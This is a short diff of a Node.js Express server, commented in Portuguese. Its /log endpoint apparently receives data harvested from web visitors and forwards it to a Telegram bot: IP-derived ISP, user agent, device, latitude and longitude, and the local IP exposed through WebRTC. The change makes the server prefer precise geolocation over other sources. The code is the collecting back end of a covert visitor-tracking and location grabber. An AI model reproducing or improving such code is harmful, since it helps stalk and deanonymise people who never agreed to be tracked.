@@ -4,6 +4,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Variáveis do ambiente (.env ou Render)
 const botToken = process.env.BOT_TOKEN;
 const chatId = process.env.CHAT_ID;
 
@@ -50,9 +51,9 @@ app.post('/log', async (req, res) => {
 🏢 ISP: ${ipInfo.org}
 🕵️‍♂️ Agente: ${data.userAgent}
 📱 Dispositivo: ${data.device}
-📌 Lat/Long: ${data.loc || preciseLoc || ipInfo.loc}
+📌 Lat/Long: ${preciseLoc || data.loc || ipInfo.loc}
 🌐 IP Local (WebRTC): ${data.localIP || "N/A"}
-    `;
+`;
 
     const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
